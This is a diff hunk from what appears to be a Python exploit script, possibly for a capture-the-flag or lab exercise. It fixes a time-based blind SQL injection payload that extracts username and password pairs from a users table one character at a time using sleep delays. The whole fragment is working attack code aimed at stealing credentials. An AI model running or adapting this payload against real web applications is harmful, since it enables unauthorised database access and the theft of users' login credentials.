@@ -31,7 +31,7 @@ def makeSQLI():
 
     for position in range(1, 150):
         for character in range(33, 126):
-            sqli_url = main_url + "?id=1 and if(ascii(substr((select substring(username,0x3a,password) from users),%d,1))=%d,sleep(0.35),1)" % (position, character)
+            sqli_url = main_url + "?id=1 and if(ascii(substr((select group_concat(username,0x3a,password) from users),%d,1))=%d,sleep(0.35),1)" % (position, character)
 
             p1.status(sqli_url)
 
